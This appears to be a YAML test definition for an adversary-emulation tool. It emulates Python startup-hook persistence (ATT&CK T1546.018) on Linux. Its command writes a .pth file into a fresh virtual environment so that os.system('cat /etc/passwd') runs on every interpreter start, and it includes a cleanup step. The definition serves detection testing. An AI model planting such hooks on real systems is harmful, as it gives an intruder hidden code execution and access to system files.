- id: 85f21c19-18ef-4450-98d8-05bb7b0e1887
  name: Python Startup Hook Execution via .pth (Linux)
  description: Creates a Python startup hook using a .pth file inside a virtual environment
    on Linux.
  tactic: persistence
  technique:
    attack_id: T1546.018
    name: 'Event Triggered Execution: Python Startup Hooks'
  platforms:
    linux:
      sh:
        command: PYTHON_EXE=$(command -v python3); TEMPDIR=$(mktemp -d /tmp/atomic_python_hook_XXXXXX);
          echo "$TEMPDIR" > /tmp/atomic_python_hook_path.txt; $PYTHON_EXE -m venv
          "$TEMPDIR/env"; SITE_PACKAGES=$("$TEMPDIR/env/bin/python" -c "import site;
          print(site.getsitepackages()[0])"); echo "import sys, os; (not hasattr(sys,
          'hook_run')) and (setattr(sys, 'hook_run', True) or os.system('cat /etc/passwd'))"
          > "$SITE_PACKAGES/atomic_hook.pth"; "$TEMPDIR/env/bin/python" -c "print('Interpreter
          started')"
        cleanup: rm -rf $(cat /tmp/atomic_python_hook_path.txt) && rm -f /tmp/atomic_python_hook_path.txt
        elevation_required: false
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
